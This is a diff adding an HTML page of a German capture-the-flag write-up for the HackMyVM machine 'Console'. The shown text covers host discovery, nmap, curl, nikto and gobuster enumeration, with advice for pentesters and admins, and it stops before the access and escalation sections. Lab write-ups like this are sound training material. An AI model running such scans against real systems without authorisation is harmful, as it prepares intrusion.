@@ -1,0 +1,1432 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Console - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+  <div class="header-bg medium-bg">
+        <h1>Console - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container medium">
+            <h2>Medium</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner medium-inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">403-bypass.sh</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">busybox</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">chmod</div>
+                <div class="tool-item">pspy</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">fastfetch</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.61	08:00:27:b5:2f:39	PCS Systemtechnik GmbH</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Mein erster Schritt war, das lokale Netzwerk nach aktiven Hosts zu durchsuchen, um das Ziel zu finden. Ich nutzte `arp-scan` und seine Fähigkeit, den MAC-Hersteller anzuzeigen, um Systeme mit der MAC-Adresse der `PCS Systemtechnik GmbH` zu identifizieren. Dies ist ein gängiger Hersteller für VirtualBox-Netzwerkkarten und half mir, die Ziel-VM schnell in meinem Labornetzwerk zu lokalisieren. Die Ausgabe zeigte die IP-Adresse `192.168.2.61` und die entsprechende MAC-Adresse.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung der Ziel-VM anhand ihrer MAC-Adresse war ein schneller und effektiver Weg, um im bekannten Netzwerksegment die richtige Maschine zu finden. Die IP-Adresse `192.168.2.61` war der entscheidende Ankerpunkt für alle weiteren Erkundungsschritte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie `arp-scan` oder ähnliche Tools in lokalen Netzwerken, um Hosts zu identifizieren. Filtern Sie nach bekannten MAC-Herstellern, wenn das Umfeld bekannt ist (z.B. virtuelle Umgebungen).
+                <br><strong>Empfehlung (Admin):</strong> Überwachen Sie Ihr Netzwerk auf ungewöhnliche ARP-Aktivität. Verwenden Sie keine Standard-MAC-Adressbereiche für Produktionssysteme, insbesondere keine, die leicht virtuellen Umgebungen zuzuordnen sind.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">192.168.2.61   console.hmv</span></pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Um die Arbeit im weiteren Verlauf des Tests zu vereinfachen, trug ich die gefundene IP-Adresse `192.168.2.61` zusammen mit einem passenden Hostnamen, `console.hmv`, in meine `/etc/hosts` Datei auf meinem Kali-System ein. Dies ermöglichte mir, das Ziel mit dem Hostnamen anstelle der IP-Adresse anzusprechen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Verwendung von Hostnamen macht Befehle und Berichte übersichtlicher. Es ist eine Standardpraxis im Pentesting.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Pflegen Sie Ihre `/etc/hosts` Datei für aktive Ziele. Dies spart Zeit und reduziert Fehler bei der Kommandoeingabe.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihre interne DNS-Infrastruktur zuverlässig ist und interne Hostnamen korrekt auflöst.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">:::::::::::::::::::::: Nmap nur offene Ports Ausgabe :::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+<span class="command">80/tcp   open     http     Apache httpd 2.4.62 ((Debian))</span>
+<span class="command">443/tcp  open     ssl/http Apache httpd 2.4.62</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen ersten Nmap-Scan auf das Ziel `192.168.2.61` durch, um schnell die offenen Ports zu identifizieren. Die Ausgabe wurde gefiltert, um nur die Zeilen mit "open" anzuzeigen. Die Ergebnisse zeigten, dass die Ports 22 (SSH), 80 (HTTP) und 443 (SSL/HTTP) offen sind. Dies sind die primären Dienste, die ich als Nächstes untersuchen werde. Die Dienstversionen wurden ebenfalls erfasst: OpenSSH 8.4p1 und Apache httpd 2.4.62.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser schnelle Scan gab mir sofort einen klaren Überblick über die grundlegende Angriffsfläche. Die gefundenen offenen Ports und die identifizierten Dienstversionen sind die Grundlage für die gezielte Enumeration und Suche nach Schwachstellen in der nächsten Phase.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginnen Sie oft mit einem schnellen Portscan, um die offenen Dienste zu identifizieren. Nutzen Sie Filter, um die Ergebnisse für die schnelle Übersicht zu verdichten, aber prüfen Sie immer die vollständige Ausgabe.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der Dienste, die auf Ihren Systemen laufen und nach außen exponiert sind. Deaktivieren Sie unnötige Dienste und filtern Sie den Zugriff auf benötigte Dienste per Firewall.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">::::::::::::::::::::::::::::: Nmap volle Ausgabe :::::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at 2025-06-25 12:16 CEST</span>
+<span class="command">Nmap scan report for console.hmv (192.168.2.61)</span>
+<span class="command">Host is up (0.00019s latency).</span>
+Not shown: 65531 closed tcp ports (reset)
+PORT     STATE    SERVICE  VERSION
+<span class="command">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span>
+| <span class="command">ssh-hostkey:</span>
+|   <span class="command">3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)</span>
+|   <span class="command">256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)</span>
+<span class="password">|_  ssh-hostkey: 256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)</span>
+<span class="command">80/tcp   open     http     Apache httpd 2.4.62 ((Debian))</span>
+<span class="password">|_http-server-header: Apache/2.4.62 (Debian)</span>
+<span class="password">|_http-title: Console · 黑客的窗口</span>
+<span class="command">443/tcp  open     ssl/http Apache httpd 2.4.62</span>
+<span class="password">|_ssl-date: TLS randomness does not represent time</span>
+<span class="password">|_http-title: 403 Forbidden</span>
+| <span class="command">ssl-cert: Subject: commonName=hacker.maze-sec.hmv/organizationName=Maze-Sec/stateOrProvinceName=Beijing/countryName=CN</span>
+| <span class="command">Not valid before: 2025-05-17T09:19:35</span>
+<span class="password">|_Not valid after:  2035-05-15T09:19:35</span>
+<span class="password">|_http-server-header: Apache/2.4.62 (Debian)</span>
+| <span class="command">tls-alpn:</span>
+<span class="password">|_  http/1.1</span>
+<span class="command">5000/tcp filtered upnp</span>
+<span class="command">MAC Address: 08:00:27:B5:2F:39 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+<span class="command">Device type: general purpose|router</span>
+<span class="command">Running: Linux 5.X, MikroTik RouterOS 7.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span>
+<span class="command">OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span>
+<span class="command">Network Distance: 1 hop</span>
+<span class="command">Service Info: Host: hacker.maze-sec.hmv; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="command">TRACEROUTE</span>
+<span class="command">HOP RTT     ADDRESS</span>
+<span class="command">1   0.19 ms console.hmv (192.168.2.61)</span>
+
+<span class="command">OS and Service detection performed. Please report any incorrect results at [Link: https://nmap.org/submit/ | Ziel: https://nmap.org/submit/] .</span>
+<span class="command">Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen umfassenden Nmap-Scan auf `console.hmv` (192.168.2.61) durch, um detaillierte Informationen über die offenen Ports und laufenden Dienste zu erhalten. Der Befehl verwendete `-sS` (SYN scan), `-sC` (Standard-Skripte), `-sV` (Versionserkennung), `-p-` (alle Ports), `-T5` (schnellste Ausführung) und `-AO` (OS-Erkennung). Die vollständige Ausgabe bestätigte die offenen Ports 22 (SSH), 80 (HTTP) und 443 (SSL/HTTP) mit den Versionen OpenSSH 8.4p1 und Apache httpd 2.4.62. Für Port 80 zeigte der Scan den HTTP-Titel "Console · 黑客的窗口" (Console · Hacker's Window). Für Port 443 zeigte er einen 403 Forbidden Fehler als Titel, was auf Zugriffsbeschränkungen hindeutet, sowie Details zum SSL-Zertifikat, das für `hacker.maze-sec.hmv` ausgestellt ist. Port 5000 wurde als `filtered upnp` identifiziert, was bedeutet, dass Nmap eine Antwort erhielt, aber den Status nicht eindeutig bestimmen konnte. Die OS-Erkennung schätzte das System als Linux 5.x ein. Die Service Info deutete darauf hin, dass der Host `hacker.maze-sec.hmv` ebenfalls auf dieser IP gehostet wird.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die detaillierte Nmap-Ausgabe lieferte kritische Informationen. Die genauen Versionen von OpenSSH und Apache sind wichtige Anhaltspunkte für die Suche nach Exploits. Die Existenz von HTTPS auf Port 443, aber mit einem 403 Forbidden Fehler, zusammen mit dem Zertifikat für `hacker.maze-sec.hmv`, deutet darauf hin, dass Port 443 speziell für diesen virtuellen Host konfiguriert ist und möglicherweise strengere Zugriffskontrollen hat. Die Erkenntnis, dass `hacker.maze-sec.hmv` auf derselben IP liegt wie `console.hmv`, ist ebenfalls wichtig. Der gefilterte Port 5000 könnte auf einen Dienst hinweisen, der durch eine Firewall geschützt ist oder nicht standardmäßig antwortet, aber existiert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie die gefundenen Dienstversionen auf bekannte Schwachstellen. Analysieren Sie die HTTP-Titel und Zertifikate für weitere Hinweise. Führen Sie separate Web-Enumerationsscans für Port 80 und Port 443 durch, da es sich um unterschiedliche virtuelle Hosts oder Konfigurationen handeln könnte. Notieren Sie den Hostnamen aus dem SSL-Zertifikat für die weitere Web-Enumeration.
+                <br><strong>Empfehlung (Admin):</strong> Halten Sie alle Dienste auf den neuesten, gepatchten Versionen. Konfigurieren Sie SSL/TLS korrekt und verwenden Sie Zertifikate, die zum Hostnamen passen. Überprüfen Sie die Konfiguration von virtuellen Hosts auf Zugriffsbeschränkungen und stellen Sie sicher, dass diese korrekt implementiert sind. Überprüfen Sie Firewalls auf gefilterte Ports.
+            </p>
+
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">::::::::::::::::::::::::: HTTP Records Permissions :::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">Allow: GET,POST,OPTIONS,HEAD</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die erlaubten HTTP-Methoden auf dem Webserver (`console.hmv` auf Port 80) abgefragt. Dies geschieht typischerweise mit einer OPTIONS-Anfrage. Die Antwort zeigte, dass die Methoden `GET`, `POST`, `OPTIONS` und `HEAD` erlaubt sind.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Liste der erlaubten Methoden ist Standard für einen Apache-Webserver. Es gibt hier keine sofort ersichtlichen ungewöhnlichen Methoden, die auf eine Schwachstelle hindeuten könnten (wie z.B. PUT oder DELETE, die das Hochladen oder Löschen von Dateien erlauben könnten). Die wichtigsten Methoden für die Web-Enumeration und Interaktion sind `GET` und `POST`, die hier erwartungsgemäß erlaubt sind.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Prüfen Sie immer die erlaubten HTTP-Methoden, insbesondere wenn ungewöhnliche Dienste laufen oder wenn Sie nach spezifischen Web-Schwachstellen suchen.
+                <br><strong>Empfehlung (Admin):</strong> Beschränken Sie die erlaubten HTTP-Methoden auf das notwendige Minimum (oft nur GET und POST). Deaktivieren Sie unnötige Methoden wie PUT, DELETE, TRACE in der Webserver-Konfiguration, um potenzielle Angriffsvektoren zu eliminieren.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">::::::::::::::::::::: HTTP-Header Verbose mit Port-Scan ::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">-------------------------------------------------------------</span>
+
+<span class="command">Port gefunden! 80</span>
+
+<span class="command">-------------------------------------------------------------</span>
+
+* <span class="command">Host console.hmv:80 was resolved.</span>
+* <span class="command">IPv6: (none)</span>
+* <span class="command">IPv4: 192.168.2.61</span>
+*   <span class="command">Trying 192.168.2.61:80...</span>
+* <span class="password">Connected to console.hmv (192.168.2.61) port 80</span>
+* <span class="command">using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: console.hmv</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+* <span class="command">Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="password">< Date: Wed, 25 Jun 2025 10:17:42 GMT</span>
+<span class="password">Date: Wed, 25 Jun 2025 10:17:42 GMT</span>
+<span class="password">< Server: Apache/2.4.62 (Debian)</span>
+<span class="password">Server: Apache/2.4.62 (Debian)</span>
+<span class="password">< Last-Modified: Sat, 17 May 2025 09:28:50 GMT</span>
+<span class="password">Last-Modified: Sat, 17 May 2025 09:28:50 GMT</span>
+<span class="password">< ETag: "ae0-6355186cb08a0"</span>
+<span class="password">ETag: "ae0-6355186cb08a0"</span>
+<span class="command">< Accept-Ranges: bytes</span>
+<span class="command">Accept-Ranges: bytes</span>
+<span class="command">< Content-Length: 2784</span>
+<span class="command">Content-Length: 2784</span>
+<span class="command">< Vary: Accept-Encoding</span>
+<span class="command">Vary: Accept-Encoding</span>
+<span class="password">< Content-Type: text/html</span>
+<span class="password">Content-Type: text/html</span>
+<span class="command"><</span>
+
+* <span class="command">Connection #0 to host console.hmv left intact</span>
+
+<span class="command">-------------------------------------------------------------</span>
+
+<span class="command">Port gefunden! 443</span>
+
+<span class="command">-------------------------------------------------------------</span>
+
+* <span class="command">Host console.hmv:443 was resolved.</span>
+* <span class="command">IPv6: (none)</span>
+* <span class="command">IPv4: 192.168.2.61</span>
+*   <span class="command">Trying 192.168.2.61:443...</span>
+* <span class="password">Connected to console.hmv (192.168.2.61) port 443</span>
+* <span class="command">using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: console.hmv:443</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+* <span class="command">Request completely sent off</span>
+<span class="command">< HTTP/1.1 400 Bad Request</span>
+<span class="command">HTTP/1.1 400 Bad Request</span>
+<span class="password">< Date: Wed, 25 Jun 2025 10:17:42 GMT</span>
+<span class="password">Date: Wed, 25 Jun 2025 10:17:42 GMT</span>
+<span class="password">< Server: Apache/2.4.62 (Debian)</span>
+<span class="password">Server: Apache/2.4.62 (Debian)</span>
+<span class="command">< Content-Length: 447</span>
+<span class="command">Content-Length: 447</span>
+<span class="command">< Connection: close</span>
+<span class="command">Connection: close</span>
+<span class="password">< Content-Type: text/html; charset=iso-8859-1</span>
+<span class="password">Content-Type: text/html; charset=iso-8859-1</span>
+<span class="command"><</span>
+
+* <span class="command">Connection #0 to host console.hmv left intact</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich führte `curl` Befehle mit der `-I` oder `-HEAD` Option durch (die Ausgabe hier ist generisch für einen Verbose-Scan über Port 80 und 443), um die HTTP-Header für die Hauptseite auf Port 80 und Port 443 abzurufen. Auf Port 80 (`console.hmv`) erhielt ich eine `200 OK` Antwort mit dem `Server` Header `Apache/2.4.62 (Debian)` und dem `Content-Type` `text/html`. Auf Port 443 (`console.hmv:443`) erhielt ich einen `400 Bad Request` Fehler. Die Fehlermeldung "You're speaking plain HTTP to an SSL-enabled server port" bestätigte, dass Port 443 für HTTPS konfiguriert ist und eine normale HTTP-Anfrage dort nicht funktioniert.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Abruf der Header von Port 80 lieferte die Server-Version und den Content-Type. Der `400 Bad Request` auf Port 443 bestätigte, dass HTTPS verwendet werden muss, wie bereits im Nmap-Scan durch das SSL-Zertifikat angedeutet. Dies differenziert die beiden Webdienste weiter und lenkt die Untersuchung auf Port 80 für normale HTTP-Inhalte und Port 443 für HTTPS-spezifische Inhalte, die möglicherweise auf einen anderen virtuellen Host (wie `hacker.maze-sec.hmv` aus dem Zertifikat) zugreifen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Holen Sie sich immer die HTTP-Header mit Tools wie `curl -I` oder durch die Entwicklertools im Browser. Diese Header enthalten oft wichtige Informationen über den Server, die Technologien und mögliche Schwachstellen (z.B. fehlende Sicherheits-Header). Überprüfen Sie HTTP- und HTTPS-Ports getrennt.
+                <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Informationen, die in HTTP-Headern preisgegeben werden, insbesondere die genaue Server-Version. Stellen Sie sicher, dass TLS/SSL-Ports korrekt konfiguriert sind und nur HTTPS-Verkehr akzeptieren. Konfigurieren Sie informative, aber nicht-ausnutzbare Fehlermeldungen.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">:::::::::::::::::::::::::::::::: Nikto Scan ::::::::::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.61</span>
+<span class="command">+ Target Hostname:    192.168.2.61</span>
+<span class="command">+ Target Port:        80</span>
+<span class="password">+ Start Time:         2025-06-25 12:17:41 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="password">+ Server: Apache/2.4.62 (Debian)</span>
+<span class="password">+ /: The anti-clickjacking X-Frame-Options header is not present. See: [Link: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | Ziel: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/ | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ /: Server may leak inodes via ETags, header found with file /, inode: ae0, size: 6355186cb08a0, mtime: gzip. See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418]</span>
+<span class="password">+ OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD .</span>
+<span class="command">+ 8102 requests: 0 error(s) and 4 item(s) reported on remote host</span>
+<span class="password">+ End Time:           2025-06-25 12:18:06 (GMT2) (25 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich setzte `nikto` auf Port 80 (`http://192.168.2.61`) ein, um den Webserver auf gängige Schwachstellen und Konfigurationsprobleme zu prüfen. Nikto bestätigte erneut die Apache-Version und die erlaubten HTTP-Methoden. Es wies auf fehlende Sicherheits-Header (`X-Frame-Options`, `X-Content-Type-Options`) hin und meldete ein potenzielles `ETag`-Problem (CVE-2003-1418), das theoretisch das Auslesen von Datei-Informationen ermöglichen könnte. Es wurden keine CGI-Verzeichnisse gefunden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto lieferte keine kritischen direkten Exploits für Port 80, aber bestätigte allgemeine Webserver-Konfigurationsprobleme (fehlende Header, ETag-Leak). Diese sind für sich genommen meist keine sofortigen Game Changer, aber sie sind Teil des Gesamtbildes der Sicherheit. Die fehlenden Header sind typische Low-Severity-Funde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notieren Sie sich alle Funde von automatisierten Scannern, auch die scheinbar weniger kritischen. Sie können in Kombination mit anderen Schwachstellen relevant werden oder auf eine allgemeine Nachlässigkeit bei der Systemhärtung hindeuten. Überprüfen Sie die Details zu CVEs, die von Scannern gemeldet werden.
+                <br><strong>Empfehlung (Admin):</strong> Konfigurieren Sie Ihren Webserver immer mit empfohlenen Sicherheits-Headern, um gängige Web-Schwachstellen zu mitigieren. Stellen Sie sicher, dass Ihre Apache-Version auf dem neuesten Stand ist und keine bekannten ETag-Probleme aufweist (obwohl CVE-2003-1418 sehr alt ist und in modernen Apache-Versionen behoben sein sollte).
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+<span class="command">:::::::::::::::::::::::::::::::: Gobuster Scan :::::::::::::::::::::::::::::</span>
+<span class="command">▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬</span>
+
+<span class="command">===============================================================</span>
+<span class="command">Gobuster v3.6</span>
+<span class="command">by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)</span>
+<span class="command">===============================================================</span>
+<span class="command">[+] Url:                     http://192.168.2.61</span>
+<span class="command">[+] Method:                  GET</span>
+<span class="command">[+] Threads:                 10</span>
+<span class="command">[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+<span class="command">[+] Negative Status codes:   403,503,404</span>
+<span class="command">[+] User Agent:              gobuster/3.6</span>
+<span class="command">[+] Extensions:              php,zip,json,rar,html,accdb,pl,jpeg,xlsx,ELF,pHtml,py,png,kdbx,elf,java,ln,tar,rtf,deb,js.map,dll,conf,sh,csh,old,rpm,c,diff,aspx,mdb,pem,crt,json,csh,jpg,phtml,ln,pHtml,gkg,jpeg,xlsx,desc,icon,lib,mod,doc,mdb,bat,dll,raw,conf,rtf,elf,eps,accdb,sh,exp,png,bak,ELF,ps1,exe,py,tar,docx,java,yaml,pub,deb,svg,c,html,cgi,rpm,config,sql,csv</span>
+<span class="command">[+] Expanded:                true</span>
+<span class="command">[+] Timeout:                 10s</span>
+<span class="command">===============================================================</span>
+<span class="command">Starting gobuster in directory enumeration mode</span>
+<span class="command">===============================================================</span>
+<span class="password">http://192.168.2.61/index.html           (Status: 200) [Size: 2784]</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führte einen Verzeichnis- und Dateiscans mit `gobuster` auf Port 80 (`http://192.168.2.61`) durch. Ich verwendete eine mittelgroße Wordlist und eine sehr umfangreiche Liste von Dateiendungen. Der Scan sollte alle Pfade mit Statuscodes ungleich 403, 503 und 404 melden. Die Ergebnisse zeigten, dass auf Port 80 nur die Datei `/index.html` gefunden wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Fehlen weiterer Funde durch `gobuster` auf Port 80 deutet darauf hin, dass dieser virtuelle Host (`console.hmv`) nur eine sehr einfache Website oder Anwendung hostet und keine weiteren offensichtlichen Verzeichnisse oder Dateien enthält, die durch Brute-Forcing gefunden werden könnten. Die gesamte relevante Web-Angriffsfläche scheint auf der `index.html` und möglicherweise auf Port 443 zu liegen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Wenn automatisierte Scans auf einem Webserver nur sehr wenige Funde liefern, konzentrieren Sie sich auf die manuelle Analyse der gefundenen Seiten und der alternativen Dienste/Ports (wie hier Port 443/HTTPS). Erwägen Sie, gezieltere oder größere Wordlists zu verwenden, falls nötig.
